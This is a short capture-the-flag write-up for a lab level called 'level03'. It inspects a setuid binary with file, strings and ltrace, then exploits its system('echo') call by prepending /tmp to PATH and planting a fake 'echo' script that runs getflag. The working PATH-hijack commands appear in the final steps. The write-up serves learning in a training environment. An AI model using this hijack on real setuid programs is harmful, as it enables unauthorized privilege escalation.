# level03

## level03 binary
Run the binary file "level03" and got taunted: "Exploit me".

## Reverse engineering
Try to know what's inside this "level03" file.  
Some tools:
- file  
A tool to get some basic information about a file.  
Run `file ./level03` and we will get:  
```
./level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```
It shows that level03 file is an "ELF 32-bit LSB exaeutable", also "not stripped".

- strings  
print the strings of printable characters in files.  
We can found system() function been called.  

- ltrace  
A library call tracer.  
Run `ltrace -i ./level03` and we can found this program calling "system()" function to launch "echo" whit the PATH stored in the "env".  

## Almost the same as "Nebula Challenge" level01
Exploit the system() call with env injection.  
1. Check the owner of the level03 file  
Make sure this file has a "higher" privilege then the user "level03".  
`ls -la ./level03` shows the owner as "flag03" who can launch "getflag" and actually get the flag.  
2. Inject a new PATH into the env.  
`export PATH=/tmp:$PATH` this adds "/tmp" path in front of other path so the programe inside "/tmp" will be called before other path (if that program exist).  
3. Create a fake "echo" program
`echo "getflag" > /tmp/echo`
4. Make it executable
`chmod +x /tmp/echo`

Run ./level03 again and you've got flag

## Takeway
- Tools to read information inside a binary file.  
- Env injection  

